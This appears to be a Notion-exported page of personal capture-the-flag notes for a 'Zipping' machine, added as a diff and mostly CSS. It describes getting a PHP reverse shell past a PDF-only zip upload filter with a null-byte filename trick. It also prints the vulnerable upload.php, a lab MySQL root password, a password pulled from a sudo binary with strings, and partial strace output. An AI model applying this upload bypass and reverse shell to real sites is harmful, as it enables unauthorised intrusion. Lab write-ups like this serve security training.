@@ -1,0 +1,824 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Zipping</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="3d6164ca-f24a-4d23-8874-49b08d453eee" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">😒</span></div><h1 class="page-title">Zipping</h1><p class="page-description"></p></header><div class="page-body"><p id="0925e3f2-415e-4084-8707-2078c89e4c89" class="">
+</p><p id="6e5e4c6c-3757-4f4a-929e-3f9daac184d8" class="">Create a reverse shell, using the pentest monkey one..</p><p id="3ebb370f-2310-4feb-baaf-bc6feebded05" class="">Name the file something like revshell.phpA.pdf</p><p id="dc2ddeea-17bc-4bc7-92f4-2e4a6c5e19be" class="">
+</p><ul id="89ac1ac3-49f6-4a03-976b-8fec1132509d" class="bulleted-list"><li style="list-style-type:disc">So we create a shell.phpA.pdf file so we can identify where to make the change</li></ul><ul id="cc8652ff-468d-490d-a2bf-73b478b779d1" class="bulleted-list"><li style="list-style-type:disc">Remove the ‘A’ with hexedit from the end of the file and add null byte ‘00’</li></ul><ul id="6cdc409f-cd7e-4ecc-8309-b3f5b934f7cc" class="bulleted-list"><li style="list-style-type:disc">Once, done zip the file</li></ul><p id="6d784fa0-9e26-43dc-9279-a3015298f905" class="">
+</p><p id="287c7a15-8b70-4c5c-b9d2-c55a5aa40110" class="">Now this file should be ready to upload!</p><p id="ba4eab4b-1627-4f93-bf39-ff06e28b743f" class="">Once uploaded the file, append the /00 and remove the .pdf part and we trigger a reverse shell</p><p id="c1c02508-f5bf-4486-9057-0ddd38d469a7" class="">
+</p><figure id="edd93768-5916-4e8d-bb41-38adbf619de1" class="image"><a href="Zipping%203d6164caf24a4d23887449b08d453eee/Untitled.png"><img style="width:1637px" src="Zipping%203d6164caf24a4d23887449b08d453eee/Untitled.png"/></a></figure><p id="ceeca578-db8a-4855-b278-be6e1a678e5b" class="">
+</p><p id="1872c024-1c2c-4dda-97c3-0899390867c6" class="">mysql password</p><p id="3ff2da52-7df6-45ce-968e-f6b83964e8a7" class="">function pdo_connect_mysql() {<br/>// Update the details below with your MySQL details<br/>$DATABASE_HOST = &#x27;localhost&#x27;;<br/>$DATABASE_USER = &#x27;root&#x27;;<br/>$DATABASE_PASS = &#x27;MySQL_P@ssw0rd!&#x27;;<br/>$DATABASE_NAME = &#x27;zipping&#x27;;<br/></p><p id="d4c8b0de-f9b2-4605-b013-ec002a5765fa" class="">
+</p><p id="5bfff2a1-8da0-403f-b48f-1860ff90089f" class="">upload.php file content</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="08dcb275-d089-422f-aae0-8f539ad00198" class="code"><code class="language-PowerShell">rektsu@zipping:/var/www/html$ cat upload.php
+&lt;html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+        &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+    &lt;meta name=&quot;description&quot; content=&quot;Start your development with Creative Design landing page.&quot;&gt;
+    &lt;meta name=&quot;author&quot; content=&quot;Devcrud&quot;&gt;
+    &lt;title&gt;Zipping | Watch store&lt;/title&gt;
+
+    &lt;!-- font icons --&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;assets/vendors/themify-icons/css/themify-icons.css&quot;&gt;
+
+    &lt;!-- Bootstrap + Creative Design main styles --&gt;
+        &lt;link rel=&quot;stylesheet&quot; href=&quot;assets/css/creative-design.css&quot;&gt;
+
+&lt;/head&gt;
+&lt;body data-spy=&quot;scroll&quot; data-target=&quot;.navbar&quot; data-offset=&quot;40&quot; id=&quot;home&quot;&gt;
+    &lt;!-- Page Header --&gt;
+    &lt;header class=&quot;header header-mini&quot;&gt; 
+      &lt;div class=&quot;header-title&quot;&gt;Work with Us&lt;/div&gt; 
+      &lt;nav aria-label=&quot;breadcrumb&quot;&gt;
+         &lt;ol class=&quot;breadcrumb&quot;&gt;
+            &lt;li class=&quot;breadcrumb-item&quot;&gt;&lt;a href=&quot;index.php&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+            &lt;li class=&quot;breadcrumb-item active&quot; aria-current=&quot;page&quot;&gt;Work with Us&lt;/li&gt;
+         &lt;/ol&gt;
+      &lt;/nav&gt;
+    &lt;/header&gt; &lt;!-- End Of Page Header --&gt;
+
+    &lt;section id=&quot;work&quot; class=&quot;text-center&quot;&gt;
+        &lt;!-- container --&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;h1&gt;WORK WITH US&lt;/h1&gt;
+            &lt;p class=&quot;mb-5&quot;&gt;If you are interested in working with us, do not hesitate to send us your curriculum.&lt;br&gt; The application will only accept zip files, inside them there must be a pdf file containing your curriculum.&lt;/p&gt;
+
+            &lt;?php
+            if(isset($_POST[&#x27;submit&#x27;])) {
+              // Get the uploaded zip file
+              $zipFile = $_FILES[&#x27;zipFile&#x27;][&#x27;tmp_name&#x27;];
+              if ($_FILES[&quot;zipFile&quot;][&quot;size&quot;] &gt; 300000) {
+                echo &quot;&lt;p&gt;File size must be less than 300,000 bytes.&lt;/p&gt;&quot;;
+              } else {
+                // Create an md5 hash of the zip file
+                $fileHash = md5_file($zipFile);
+                // Create a new directory for the extracted files
+                $uploadDir = &quot;uploads/$fileHash/&quot;;
+                // Extract the files from the zip
+                $zip = new ZipArchive;
+                if ($zip-&gt;open($zipFile) === true) {
+                  if ($zip-&gt;count() &gt; 1) {
+                  echo &#x27;&lt;p&gt;Please include a single PDF file in the archive.&lt;p&gt;&#x27;;
+                  } else {
+                  // Get the name of the compressed file
+                  $fileName = $zip-&gt;getNameIndex(0);
+                  if (pathinfo($fileName, PATHINFO_EXTENSION) === &quot;pdf&quot;) {
+                    mkdir($uploadDir);
+                    echo exec(&#x27;7z e &#x27;.$zipFile. &#x27; -o&#x27; .$uploadDir. &#x27;&gt;/dev/null&#x27;);
+                    echo &#x27;&lt;p&gt;File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:&lt;/p&gt;&lt;a href=&quot;&#x27;.$uploadDir.$fileName.&#x27;&quot;&gt;&#x27;.$uploadDir.$fileName.&#x27;&lt;/a&gt;&#x27;.&#x27;&lt;/p&gt;&#x27;;
+                  } else {
+                    echo &quot;&lt;p&gt;The unzipped file must have  a .pdf extension.&lt;/p&gt;&quot;;
+                  }
+                 }
+                } else {
+                  echo &quot;Error uploading file.&quot;;
+                }
+
+              }
+            }
+            ?&gt;</code></pre><p id="ec294844-e238-416c-97f5-cc517cc4cfa8" class="">
+</p><p id="ddd62992-3a84-4d58-85f3-961ca8b3b5cf" class="">Running</p><p id="80c1bd6b-f3aa-48e0-a489-a5e591d409d2" class=""><code>sudo -l</code></p><p id="df3dc572-bdce-4620-8f9f-f6322e29bc30" class="">
+</p><p id="06b54a75-f96b-4d7e-a002-d10d0d00d691" class="">We can run a binary file</p><p id="0e9748fd-7917-47c1-a87e-064cfbb27c57" class=""><code>/usr/bin/stock  </code></p><p id="15a93553-0d87-4448-ae23-890f2dc932c7" class="">
+</p><p id="f48133f5-2afb-4224-9248-05ed1f6c5e3a" class="">If we run strings on it we get a password:</p><p id="1525a243-74fb-4700-8285-66c6829dbc3f" class=""><code>St0ckM4nager</code></p><p id="8d1974ef-b5b8-4f7c-a245-332a0b67bdd3" class="">
+</p><p id="e6f1e27a-586e-4897-98dd-2ee0ddfd2b7a" class="">If we check the stock we do not have the permission to read the file</p><figure id="df28f57b-7ae9-453b-97e0-76a4e6364a1e" class="image"><a href="Zipping%203d6164caf24a4d23887449b08d453eee/Untitled%201.png"><img style="width:821px" src="Zipping%203d6164caf24a4d23887449b08d453eee/Untitled%201.png"/></a></figure><p id="e25a4489-d1ba-4cff-a88c-347b0cb98d76" class="">
+</p><p id="217d8e01-bdbd-4963-bff9-30221e4d1f7a" class="">strace command on the binary:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ede63762-f5fc-4731-9f76-a82e25de4df3" class="code"><code class="language-PowerShell">rektsu@zipping:/home/rektsu$ strace /usr/bin/stock
+execve(&quot;/usr/bin/stock&quot;, [&quot;/usr/bin/stock&quot;], 0x7ffdb60cc5b0 /* 18 vars */) = 0
+brk(NULL)                               = 0x55aeea52a000
+arch_prctl(0x3001 /* ARCH_??? */, 0x7ffc69d16fb0) = -1 EINVAL (Invalid argument)
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6bbc8ea000
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=18225, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 18225, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f6bbc8e5000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\3206\2\0\0\0\0\0&quot;..., 832) = 832
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=2072888, ...}, AT_EMPTY_PATH) = 0
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+mmap(NULL, 2117488, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f6bbc600000
+mmap(0x7f6bbc622000, 1544192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7f6bbc622000
+mmap(0x7f6bbc79b000, 356352, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19b000) = 0x7f6bbc79b000
+mmap(0x7f6bbc7f2000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1f1000) = 0x7f6bbc7f2000
+mmap(0x7f6bbc7f8000, 53104, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f6bbc7f8000
+close(3)                                = 0
+mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6bbc8e2000
+arch_prctl(ARCH_SET_FS, 0x7f6bbc8e2740) = 0
+set_tid_address(0x7f6bbc8e2a10)         = 10663
+set_robust_list(0x7f6bbc8e2a20, 24)     = 0
+rseq(0x7f6bbc8e3060, 0x20, 0, 0x53053053) = 0
+mprotect(0x7f6bbc7f2000, 16384, PROT_READ) = 0
+mprotect(0x55aee9ebd000, 4096, PROT_READ) = 0
+mprotect(0x7f6bbc920000, 8192, PROT_READ) = 0
+prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
